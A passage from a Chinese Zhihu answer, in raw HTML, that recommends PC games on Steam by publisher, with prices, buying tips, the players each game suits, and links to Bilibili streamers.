alt=\"\"></figure><p>很喜欢《西部世界》系列的美剧，虽然西部世界并不算靠西部吃饭，但是所描写的那个西部风格真心让人很想玩一玩，我想应该也有很多和我一样看了《西部世界》，喜欢《西部往事》、《不可饶恕》、《被解救的姜戈》这些电影，如果要对应的话，西部题材中带着牛仔帽穿着长筒皮靴的牛仔们，更像是中国性格爽快、风尘仆仆具有侠义之气的侠客风格的作品。</p>\n<p>当然也有很多人对西部题材并不感冒，也没有代入感，但也不影响轻度的游戏性和观赏性，要知道这可是 Rockstar，我意见是可以不补票 GTAV，但是可以体验 R 星的又一款神级作品。</p>\n<p>PS. 大表哥 2 是我线上 + 线下时长最久的游戏，也是我最喜欢的游戏世界</p>\n<p><a href=\"https://www.zhihu.com/question/299877407/answer/1539234958\">如何评价游戏《荒野大镖客:救赎 2》的男主角亚瑟摩根(Arthur Morgan)?</a></p>\n<p><strong>推荐主播：</strong></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1rs411D7Vj\" target=\"_blank\" rel=\"nofollow noreferrer\">补档【GTA5 剧情金牌挑战攻略】</a> 黑桐谷歌</p>\n<p><a href=\"https://www.zhihu.com/question/35296900/answer/%3Ci%3Eht%3C/i%3Etps://www.bilibili.com/video/BV12b411P7KW?from=search&amp;seid=17902940469888097525\">【共 P91 完结】老戴《荒野大镖客 2》</a> 老戴</p>\n<p><strong>3. B 社 上古卷轴 5 重制版 64 元</strong></p>\n<p>老头滚动条，少女卷轴 5，又称 MOD5，</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-440ede31bbbaa06e137421601acf2d83_720w.jpg?source=8673f162\" alt=\"\"></figure><p>因为另一个舍友沉迷上千小时的缘故，我又接触到了一款神级作品，支持相当高的自由度，职业、武器、技能可选择的相当多，利用好 MOD，这又会是一款完完全全的新游戏。</p>\n<p><strong>适合人群：想要为所欲为的玩家（yilingsama?）</strong></p>\n<p>PS：虽然巫师 3 和老滚 5 是虚构世界，但实际上好好看地图你会 yy，昆特大陆=欧洲大陆，泰姆瑞尔大陆=地球。</p>\n<p>既然都聊到 B 社了，就接上捡垃圾的辐射 4，辐射系列应该也属于老情怀党们的游戏了，萌新也很推荐入手。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-b49c9d32040c1d04a3f8712a43459f89_720w.jpg?source=8673f162\" alt=\"\"></figure><p>还有近期的辐射 76</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-8f8e76fc7dfa2d5debeaa1842e2d7dba_720w.jpg?source=8673f162\" alt=\"\"></figure><p>老游戏 Doom</p>\n<p><strong>B 社新作 DOOM Eternal</strong></p>\n<p>还没上线，不过在 FPS 是元老级别的游戏了，感兴趣的可以入前作</p>\n<p>2020 年 5 月 10 日，100h 刷刷刷过后来更新，B 社什么时候能更新老滚 6 呢？</p>\n<p>晕 3D 一定要慎重购买，不晕的话，如果你是 fps 深度爱好者，doom eternal 一定是你的菜！</p>\n<p>另：这个游戏调到地域级难度，堪比魂类。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-72606091c309b1c257ef323f9162c31a_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>推荐主播：</strong></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1fW411i7z6%3Ffrom%3Dsearch%26seid%3D1297433323137297410\" target=\"_blank\" rel=\"nofollow noreferrer\">【西门】《上古卷轴 5》战士流娱乐流程实况合集（主线完结）</a></p>\n<p><strong>4. Ubi 刺客信条奥德赛&amp;起源 黄金版 99 元&amp;62 元</strong></p>\n<p>无双信条√ 旅游风景模拟器√</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-35b4715d74f357afbc3de61cba3bc25a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>最早接触是 Ezio 三部曲年代，经典还是经典，不过 2020 再推荐显得对不起年货 ubi。</p>\n<p>同样两款以 ACO 的作品，我很难说只买哪一部，玩的话我觉得先玩起源再玩奥德赛，我自己花费时间是奥德赛 150h，起源 80h。</p>\n<p>两部一定要玩 DLC，虽然同质化搞得我肝疼，但是养老看看风景还是不错的。</p>\n<p>购买建议：两部都买的话就先玩起源，如果还想继续深入我觉得黑旗、枭雄、大革命都是可以入手的；都玩过的，可以继续入手 ubi 的远哭 5 和看门狗 2，反正大哥出啥玩啥。</p>\n<p><strong>适合人群：历史爱好者，养老人士，古希腊文明&amp;埃及文明爱好者</strong></p>\n<p><strong>英灵殿 298/498/598</strong></p>\n<p><strong>其实 uplay 买有 u 点的折扣我花了 440 预购的 PC 终极版，比起 RE3 的短小精悍，我觉得这 400 不贵，当然等我肝完英灵殿后，没准还是会骂 ubi。</strong></p>\n<p>然后得到了“ 狂战士装备组合包”、“ 狂战士居民地组合包”、“ 狂战士长船组合包”。</p>\n<p>嗯...</p>\n<p>可以肯定 一点是英灵殿会上 steam，但是不知道是一个月，还是半年，还是一年，我发小说要等它上 steam，不过我等不了，万一我 GG 了没玩到，岂不是很亏？</p>\n<p><strong>推荐主播：</strong></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//space.bilibili.com/585267%3Ffrom%3Dsearch%26seid%3D13198927195410197078\" target=\"_blank\" rel=\"nofollow noreferrer\">- 纯黑 -</a> 纯黑做了挺多刺客信条系列，不过大佬真的是几乎什么都玩</p>\n<p>关于各种奇葩的 bug，请百度或者贴吧，只有你想不到的没有你搜不到的，玩育碧总有搜集和怪能让你抓狂。</p>\n<p><strong>5. FS 只狼 174 元</strong></p>\n<p>这游戏并不难，我只是死了几千次而已。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9e4107456514a7e236bd1569dede446f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>Practice makes perfect. 熟能生巧</p>\n<p>每次完美格挡让我感觉我在玩源氏睡安娜，我并不是说要学紫雨、D2、羽毛他们玩到酷炫玩到极限，每个人有每个人的感悟和道，每个人有每个人摸索出来打斗通关的方式。</p>\n<p>当然了，我喜欢只狼也不只是打斗，他的风格实在是和中国古典风格太相近了，我觉得喜欢看古装剧的可以多去去仙峰寺的那几株红杉上看看落日寺庙风景，真的也可以算风景模拟器了。</p>\n<p>购买建议：觉得打完屑一狼还不过瘾的可以玩玩黑魂 3 和血源诅咒，都是神作。</p>\n<p><strong>适合人群：愿意在游戏里“受罪”的玩家，喜欢打击感的玩家</strong></p>\n<p><strong>黑暗之魂 3 99 元</strong></p>\n<figure><img src=\"https://pic4.zhimg.com/v2-9ba8531a761cbe6bad755a1dd792361a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>推荐主播：CP？</p>\n<p><a href=\"https://www.zhihu.com/question/35296900/answer/http%3Ci%3Es:%3C/i%3E//www.bilibili.com/video/BV1Nb41177ja?from=search&amp;seid=9693841351338193852\">【完结】【苦手专用】老戴《只狼》</a></p>\n<p><a href=\"https://www.zhihu.com/editor/http%3Ci%3Es:%3C/i%3E//www.zhihu.com/question/35296900/answer/%3Ci\">紫雨 carol《只狼：影逝二度》只狼全流程全收集全结</a></p>\n<p>【黑暗之魂 3】黑桐谷歌视频攻略解说</p>\n<p><strong>6. SE 古墓丽影 9&amp;10 崛起 年度版 13 元&amp;24 元</strong></p>\n<p>Adventures of Lara Croft</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-695fdfb2c4014f39811234db85f67dd8_720w.jpg?source=8673f162\" alt=\"\"></figure><p>我觉得古墓丽影更像是一款甜品游戏，有时间就去清一个区，做一次探险。</p>\n<p>而且说句真心话，卡关和 BUG 比 ubi 少多了，刺客信条很多探秘收集真的是太深入了有点肝，古墓丽影系列探秘其实并不算肝，难度也恰到好处，还能满足下 FPS 玩家打打枪。</p>\n<p>其实暗影这一部我也玩了，主线有点短，因为首发价过高大家普遍期望他能超越崛起，但是说实话如果你刚玩完崛起继续玩暗影，是没有任何违和感的，两者操作上基本一致，可以说暗影和崛起的差别远远小于起源和奥德赛的差别，尽管说暗影没有崛起好，但是作为完整的 3 部曲，我还是建议大家打完 9、10，可以玩玩 11，给这一代劳拉一个结局。</p>\n<p>购买建议：这个系列作品很多，大家推荐的主要是以 9、10、11 为主，如果只玩一部的话可以玩玩崛起，深入的话建议新三部曲都试试。</p>\n<p>都到水晶动力和 SE 了，就推荐下 FF15 和 2B 小姐姐</p>\n<p><strong>FF15 115 元</strong></p>\n<p>高中的二刺螈死党是 FF 系列死忠粉(就是 SE 和 KOEI 的死忠)，感觉不推荐一下都不好意思了。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-5ac08516107faf86de697029c168e18b_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>尼尔 137 元</strong></p>\n<p>100h+，全成就全结局。</p>\n<p>有人说不好，那我只能说尼尔要挑刺任谁 100h+ 都能总结得比你好，但是为什么会有这么多人喜欢，因为<strong>瑕不掩瑜</strong>，很多人总想追求完美完美的游戏，但是现实就是这样，如果没办法改变它，就应该换个思路去想想自己为什么会坚持反复一周目二周目三周目四周目</p>\n<p>还是那句话<strong>游戏是好游戏，公司属实不太行</strong>。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c612f2f625e96b32b4f07ddd21bcfea2_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>正当防卫 3 or 4 75 元 /95 元</strong></p>\n<p><strong>FPS 刷刷刷酷炫就是爽，4 的风评并不是很好这里就推荐 3 了。</strong></p>\n<figure><img src=\"https://pic4.zhimg.com/v2-4b10bca64e27fe1ca3166ea877050c71_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>Marvel's Avengers 复仇者联盟 200 元左右</strong></p>\n<p>目前还在预购阶段，不跳票的话，9 月 5 号发布，如果你是漫威粉，这饭就是难吃也得咽啊，平时 3D 电影贡献了票房，自己上手操作操作岂不是更爽。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-3c252bea7960af4ce6f72bba515b5a17_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>SE 家的还有后面更新的奇异人生</strong></p>\n<p>PS. 还有一款是看老番茄的杀手 2，后来看装机猿也玩，当时买的全 DLC，加起来大概 200 多。</p>\n<p>觉得跟古墓丽影游戏风格接近，可以玩一个区域歇一会儿以后继续，但是杀手 2 娱乐性和多样性更好，有很多各种各样的选择提供给玩家探索。</p>\n<p>推荐主播：</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1us411d7bK%3Ffrom%3Dsearch%26seid%3D17902940469888097525\" target=\"_blank\" rel=\"nofollow noreferrer\">纯黑《古墓丽影：崛起》第一期 攻略向最高难度直播录</a></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1NW411y7dD%3Ffrom%3Dsearch%26seid%3D17902940469888097525\" target=\"_blank\" rel=\"nofollow noreferrer\">【完结】【共 19P+ 评测】老戴《古墓丽影暗影》</a></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1Rx411U7h1%3Ffrom%3Dsearch%26seid%3D17902940469888097525\" target=\"_blank\" rel=\"nofollow noreferrer\">黑桐谷歌【尼尔：机械纪元】直播实况</a></p>\n<p><a href=\"https://www.zhihu.com/question/35296900/answer/h%3C/i%3Ettps://www.bilibili.com/video/BV1Ts411s7gG?from=search&amp;seid=17902940469888097525\">最终幻想 15FF15 最完整全剧情（全 DLC 含艾汀、皇家版、多人在线故事、特拉</a></p>\n<p><strong>7. WB 杀手 2 全 DLC 200 左右</strong></p>\n<p>B 站有史以来最火的系列，你确定不试试吗~ 昨天老番茄刚刚联合老鹅推出了“奶奶我最喜欢的 UP 主更新了”系列！见证 B 站第一个千万 UP</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/av95995959%3Ft%3D73\" target=\"_blank\" rel=\"nofollow noreferrer\">【老番茄】史上最骚杀手(第八集)_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili</a></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-6c5e513f176628ce6daca9dc3f6447b0_720w.jpg?source=8673f162\" alt=\"\"></figure><p>购买建议：钱不够可以玩玩免费的，充足的话建议全入，因为每章都是独立的任务，可玩性，可重复性相当高，</p>\n<p>就像一位老哥所说的<strong>杀手系列的乐趣不在于杀人而是在于重复游玩</strong>。</p>\n<p><strong>中土世界：战争之影 34 元</strong></p>\n<p>指环王风格，用一个词形容：epic，史诗大作（非 epic 平台</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9a1e03df33ddeed7eb7bffe9eaf74841_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>蝙蝠侠 阿卡姆骑士</strong></p>\n<p>蝙蝠侠在电影中地位就不用我多吹嘘了吧，游戏系列作很多，打折后比较便宜，基本上 30 元左右一部，本作和漫威一样，喜欢电影的话就可以入。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-4e6f3cea86018c04e8021daab9d2614e_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>8. 日厂光荣系列 仁王 168 元</strong></p>\n<p>2020update，他刚刚告诉我他把三国志 14 肝完了全成就，这里也推荐下吧，早期玩过信长的野望系列、真三无双系列、死或生系列，抱歉，即使你是老玩家，三国志 14 也是慎入，300 块的价格如果能承受一定要玩就入。这里更一下 KOEI 的游戏。</p>\n<p><strong>如果你喜欢日系 ACT，喜欢类魂作品，可以考虑，这不 2020 仁王 2 已经在媒体抢先体验阶段，可以去 b 站和斗鱼主机区的各大主播看。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-14491a950bfcd328ddd88b6fe075661f_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><em>下面是情怀党和多年光荣老玩家警告，没玩过 KOEI 的这些系列可以当我没有推荐</em></strong></p>\n<p><strong>三国志 14 349 元（褒贬不一警告，三国志死忠党必入）</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c4dd3e3b393633b5c905854458c3bfc5_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>死或生 6 150 元（褒贬不一警告，如果钱多没处花又想社保，可以入，当然了这是格斗游戏）</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-70957d7f9043e32b777d4a3967794852_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>真三国无双 7 猛将传 41 元 </strong></p>\n<p><strong>无双. 割草就完事了</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-e42cabd71040b4ff961315e4366cc096_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这里我还想私人放出真田丸系列，我不太清楚这是不是最好的一部真田丸</p>\n<p>战国无双 真田丸 400 元 这里就不放图了，400 元能承受，喜欢真田幸村可以入手试试</p>\n<p><strong>9. P 社游戏（按年龄摆资历肯定是 4 萌）</strong></p>\n<p>为了打出心目中理想的结局，花 100 小时熟悉规则，花 1000 小时入门又算什么？</p>\n<p><strong>有人说要我放原价，我要用欧 4 全 DLC 的 1000+RMB 原价拍大家脸上劝退吗？我放巫师 3 和 ubi 这些游戏原价真的有意义吗？没错我给出的就是巫师 3 和 ubi 的限时原价。（PS：新入坑 ubi 的玩家一定不要预购，真爱粉除外包括我）</strong></p>\n<p><strong>还是那句话 P 社游戏，爱玩玩，不玩别 bb，没钱就上学习版也不丢人，</strong></p>\n<p>我给这么多打折价就是告诉大家，既然有些老游戏你当时没有第一时间入手，那么就再等等，两三百块入个最便宜的钢铁雄心 4 全 DLC 版本不香吗？</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d782271f73605cbdd9b478417fb6f43d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>此生无悔入 P 社，基本上是初中时候大家历史课一起讨论二战，讨论中世纪的欧洲，讨论维多利亚时期的英国</p>\n<p>购买建议：土豪乱入，一款 P 社游戏价格可以把我其他推荐都买下来；喜欢哪段历史熟悉哪段历史玩哪段；喜欢太空建造系列，可以入群星。</p>\n<p><strong>适合人群：熟悉欧洲古代史，喜欢 yy 的玩家</strong></p>\n<p><strong>P 社游戏没有啥带主播</strong></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1rW411g7iS\" target=\"_blank\" rel=\"nofollow noreferrer\">【钢铁雄心 4】手把手教你玩钢 4 第一期：基础启蒙篇</a> 寨主录得，还不错，也经常发一些游戏过程中的逗比事件</p>\n<p>王国风云 2 维多利亚 2 欧陆风云 4 群星：<a href=\"http://link.zhihu.com/?target=https%3A//space.bilibili.com/13893147%3Ffrom%3Dsearch%26seid%3D17902940469888097525\" target=\"_blank\" rel=\"nofollow noreferrer\">哈布斯苟</a><a href=\"http://link.zhihu.com/?target=https%3A//space.bilibili.com/1276787%3Ffrom%3Dsearch%26seid%3D17902940469888097525\" target=\"_blank\" rel=\"nofollow noreferrer\">稚嫩的魔法师</a><a href=\"http://link.zhihu.com/?target=https%3A//space.bilibili.com/84912%3Ffrom%3Dsearch%26seid%3D17902940469888097525\" target=\"_blank\" rel=\"nofollow noreferrer\">晓月春日</a></p>\n<p><strong>10.动作天尊卡普空 鬼泣 5&amp;生化危机 2 重制版 107 元</strong></p>\n<p>ACT 王者</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-a3146b6ea353dd900c9072a3b3b6d206_720w.jpg?source=8673f162\" alt=\"\"></figure><p>不知道为什么，似乎鬼泣 5 受众没有前面推荐的高；但是我印象中在北京奥运会那几年，几个发小回国的假期聚聚都在讨论鬼泣 4、鬼泣 3，都觉得鬼泣是心目中当时最好的游戏。</p>\n<p>虽然鬼泣 5 并没有推到当年心目中天下第一的感觉，但是还是属于神作系列的作品。</p>\n<p>购买建议：喜欢生化危机电影系列，CAPCOM 的新作都可以入；玩鬼泣的情怀党必入，萌新可以玩完只狼再来体验下恶魔主题的动作游戏。</p>\n<p>既然是 CAPCOM 就不得不提 MHW</p>\n<p><strong>怪物猎人 + 冰原 两个包一起大概 300 元</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-c4d60a56969ba0c85cfc4ee9a7e4a153_720w.jpg?source=8673f162\" alt=\"\"></figure><p>我没有深度去玩，但是边打炉石边在旁边看舍友每天拿着手柄爆肝还是很有乐趣的，同样一款可以玩 1000h+ 的游戏，当然舍友属于早期在主机玩 MH 的情怀党，但是这游戏确实很不错，强烈安利。</p>\n<p>顺便再补充上同一位舍友安利给我的杀时间捡垃圾神作</p>\n<p><strong>方舟进化 41 元 配合 DLC 创世纪大概 100 元左右</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-d3ea56b18dd80529278700e92a2c27a9_720w.jpg?source=8673f162\" alt=\"\"></figure><p>自己玩或者几个人联机一起肝都非常好玩，很适合养老玩家杀时间。</p>\n<p><strong>生化危机系列 RE2、RE3、7 全系列我一共花了大概 1000+</strong></p>\n<p>上次不止为何忘了写，2020 年 5 月来更新 a 下。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-3e2402d88d459267fb8f6e72fc06a7c1_720w.jpg?source=8673f162\" alt=\"\"></figure><p>生化危机是我哥带我看的电影，也是我看的第一部恐怖电影，至今还记得那天晚上下的雷暴雨，我和我哥两个人在家全家灯都打开还害怕的要死，后来我吓得睡不着觉，我哥硬是打了一通宵的梦幻西游。</p>\n<p>而这部游戏大概就是重温经典吧，很期待卡普空未来能继续炒冷饭，在 RE 的基础上继续出完 VR 版。RE3 有点贵，1000 块有 400 是花在 RE3 上。不是很感冒的话可以玩玩 RE2 和 7，456 有点老，等重制版吧。</p>\n<p>推荐主播：</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV18b411v7ps\" target=\"_blank\" rel=\"nofollow noreferrer\">【纯黑】《鬼泣 5》一周目无伤 S 评价攻略解说</a>少爷太强，而我只会 aaaaa</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1Es411g7MF\" target=\"_blank\" rel=\"nofollow noreferrer\">黑桐谷歌的【怪物猎人世界】弓箭开荒实况</a></p>\n<p><strong>11. 2K 发行 文明 V&amp;VI 200 元左右</strong></p>\n<p>主要是寝室 3 个人连一个局域网盗版联机玩，后来 steam 入正后反而没玩多少。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-25cef64565a665acb2f775255a7e750c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>记得 DLC 要买全，玩进去了真心烧时间。</p>\n<p>2K 年货运动款我就不推荐了，还是那句话，喜欢篮球的，2K12-2K20PC、主机版全入都不是问题，这里推荐另一款好评如潮的大作。</p>\n<p><strong>无主之地 2 全 DLC 50 块左右</strong></p>\n<p>射击夺宝，简称社保，刷刷刷，非常爽，<strong>适合：休闲玩家</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-8778cf6c465fba54aec11c6308ed043f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>以及第九艺术</p>\n<p><strong>无主之地 3 300 元</strong></p>\n<p>epic 没想到吧，我能等一年。之前很多人嫖 10 美金的优惠卷，但是超豪华版还是很贵啊！！steam 上带季票打 5 折不香吗！！对于有 dlc 的项目我从来都是等 steam 出完整版打折一起购入~</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-74feae0c57bee015491770813513eee9_720w.jpg?source=8673f162\" alt=\"\"></figure><p>有我最喜欢的小吵闹，和天下独步的中文配音，这可能是历史上包括影视剧在内最好的中文配音！细心的同学可能会发现，和 8 年前的无主之地 2 是同一批中文演员配音。</p>\n<p>作为无主之地 FPS 美漫风格的死忠粉，steam 一上线就预购了超豪华版，真的香，类似的游戏还有 D2，出了暗影要塞后我只玩了 300 小时左右，无主之地我还是愿意多周目刷的。</p>\n<p><strong>生化奇兵：无限 82 元</strong></p>\n<p><strong>不玩亏死。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-be9d7dcefa4bf279997d2bfad96a0f40_720w.jpg?source=8673f162\" alt=\"\"></figure><p>喜欢文明系列的策略类玩家也可以试试 XCOM2</p>\n<p><strong>幽浮 2 48 元</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-cebbc9a2e6ba3e746ee71279edc94674_720w.jpg?source=8673f162\" alt=\"\"></figure><p>还有一款是帝国时代 2 决定版，盗版的蓝帽子 2 玩了 1000h+，其实我一直把文明和帝国 2 当作同类型游戏玩。</p>\n<p>推荐主播：</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV17s411x7j8\" target=\"_blank\" rel=\"nofollow noreferrer\">从零到高手的文明 6 教学（更新到 19 年版本）</a> 我到现在也没有摸索出来能稳过神的方法，只能不断 sl，文明新手视频还是蛮少的，大多要么是自己摸索，要么是朋友带着一起玩，学习成本稍高</p>\n<p><strong>12. 微软 帝国时代 2 决定版 39 元</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-46e9e16a9e4b6b1d9f55164652377e98_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这真是一款相当厉害的游戏，20 年了还是那几个基本的建模，一款游戏经历了 20 年，微软还在更新，在数值平衡上面应该是所有游戏中打磨地最好地几款游戏。</p>\n<p>打单机就像是模拟类游戏，种田、砍树、挖矿真的是相当经典，直到昨天晚上我们还可以中英美 3 人组局打，也是够肝。</p>\n<p>盗贼之海</p>\n<p>推荐多人入手，独狼效果 8 太好</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-64dd6ef835590d3805c203c72ee40cbc_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>光环士官长 全 dlc 接近 200 元</strong></p>\n<p>还有一款舍友 xbox 上神作，xbox 玩家可以入 hhh</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-fc8c4c7e6dfbca12595240855b5117df_720w.jpg?source=8673f162\" alt=\"\"></figure><p>另一款老游戏是骑马与砍杀系列，2020 骑砍 2 新作终于快出了，这里推荐下经典旧作</p>\n<p><strong>骑马与砍杀：战团 14 元</strong></p>\n<figure><img src=\"https://pic4.zhimg.com/v2-c71f2e12aaa595113208d8c27567cde2_720w.jpg?source=8673f162\" alt=\"\"></figure><p>推荐主播：</p>\n<p>在斗鱼帝国板块：肥龙（VIVI）、猜火车（YO）、冲动（LYX），这三位是世界级的职业选手，帝国时代这款游戏生命力真的异常顽强，至今帝国时代 2 决定版和 HD 版本常年在线人数在前三十</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1ox41147Sv\" target=\"_blank\" rel=\"nofollow noreferrer\">骑马与砍杀开局一把刀，装备都靠打！怎么当上国王？</a></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1TJ411B7E6\" target=\"_blank\" rel=\"nofollow noreferrer\">【完结】老戴《光环士官长合集 致远星》解说【PC]</a></p>\n<p><strong>骑砍 2：霸主 150 元</strong></p>\n<p>当时预购的，老玩家还有折上九折，骑砍 2 不学学育碧搞个 648 就离谱，爷爷终于等到了骑砍 2，经历了 bug 版本，beta 版本的 200 小时 + 洗礼后</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-26650558a912425ed456742cc7a0719f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>卸载，等正式版，不然都没时间玩新游戏了，唔。</p>\n<p><strong>12. SEGA 全战系列 打折基本上 100 左右拿下 全战三国 300 左右</strong></p>\n<p>期待三国以后能成为全战最好的作品之一。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-88173002ebf00b06c7086d35d9adbec8_720w.jpg?source=8673f162\" alt=\"\"></figure><p>全战也算是蛮老的系列 IP 了，算是策略系列或者说即时大战略的巅峰大作。</p>\n<p>我是出三国后才开始接触的，大概玩了不到 100h，可以打出各种各样好玩的结局，也有很多花哨的操作，各种许诺联姻，我觉得更像 BUG 玩法，还是期待能优化地更好。</p>\n<p>推荐地话首推三国，玩得有代入感，有亲切感，如果想深入玩耍，其次就是战锤 2。如果对着视频学习，上手还是比较快的，人物的建模特别是女性人物是真的有点不能忍。</p>\n<p>还是附上<strong>战锤 2 91 元</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-1440e81695de176d0ee341a32fcc282b_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>6 月 19 日更新：P 系列</strong></p>\n<p><strong>主机大作霸榜 steam 节奏</strong></p>\n<figure><img src=\"https://pic4.zhimg.com/v2-2117f667febb68432cc2795bc5e31dff_720w.jpg?source=8673f162\" alt=\"\"></figure><p>以及 SEGA 在 PS 上存在感十足的如龙系列</p>\n<p><strong>如龙：极 2 92 元</strong></p>\n<p>适合对日本黑帮感兴趣的玩家，比如说我很喜欢小栗旬的《热血高校》，玩玩如龙，体验下真男人用拳头对抗长枪大炮的热血战斗。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ea7b1a9dad895364b394d752f0f044f8_720w.jpg?source=8673f162\" alt=\"\"></figure><p>另一个室友在寝室常年用 xbox 玩 fifa，也推荐 SEGA 的</p>\n<p><strong>足球经理 2020 172 元</strong></p>\n<p><strong>适合喜欢足球(运营)的玩家玩耍。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-aa1f41d4254b3c3f352571e53bbcbf4b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>推荐主播：</p>\n<p>Dell 小明：看了他三款游戏，才发觉是同一个 up 直播的...</p>\n<p><a href=\"https://www.zhihu.com/question/35296900/answer/%3Ci%3Eht%3C/i%3Etps://www.bilibili.com/video/BV184411M7aE?from=search&amp;seid=17902940469888097525\">【完结】【全面战争三国】从零开始丨硬核实况全流程</a></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV18t411y7b8\" target=\"_blank\" rel=\"nofollow noreferrer\">【完结】【古剑奇谭 3】国产之光丨硬核实况全流程</a></p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV13J411p7Vy\" target=\"_blank\" rel=\"nofollow noreferrer\">【完结】【三国志 14】奸雄传奇丨硬核实况全流程</a></p>\n<p>包括和同学聊起他时候，都以为是小主播，但是没想到都关注了</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1zW411a7eJ\" target=\"_blank\" rel=\"nofollow noreferrer\">【完结】【异度之刃 2/ 异度神剑 2】实况全流程</a></p>\n<p>足球运营：看管大校？</p>\n<p><strong>13. 僵尸末日题材 Dayz 119 元</strong></p>\n<p><strong>日常黑苏联的僵尸多人生存题材</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-cebc5dc5f75575e86ec6adbcab03960a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>褒贬不一，就这个游戏我还没玩，建议先入手下面的游戏，被人疯狂安利 Dayz，感觉跟<strong>求生之路 2、7 日杀、消逝的光芒</strong>这些差不多。</p>\n<p>而与 DayZ 引擎相同的是<strong>波西米亚工作室</strong>另一款大作 ARMA3</p>\n<p><strong>武装突袭 3 35 元 （DLC 自行选择购买）</strong></p>\n<p>硬核打枪，非 FPS 爱好者慎入，室友 csgo 小老鹰打这个都不好使。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-e5fba8c8171d49fbef8a0a3fb007074c_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>消逝的光芒 43 元</strong></p>\n<p>全 DLC100 元之内拿下，2 也快出了，约上几个 1000h+ 的基友一起跑酷吧！</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-85f09b23da986d28f53dbc05d6c31ba4_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>猎杀：对决 89 元</strong></p>\n<p><strong>喜欢 FPS 的就对了，早期 CSGO 接触 V 社的玩家基本上以上这些 FPS 游戏都会入的。</strong></p>\n<figure><img src=\"https://pic4.zhimg.com/v2-6db2b70df9e3b3ff895777eecbe0ce62_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>地铁：离乡 119 元</strong></p>\n<p>不得不说最近上线<strong>4A 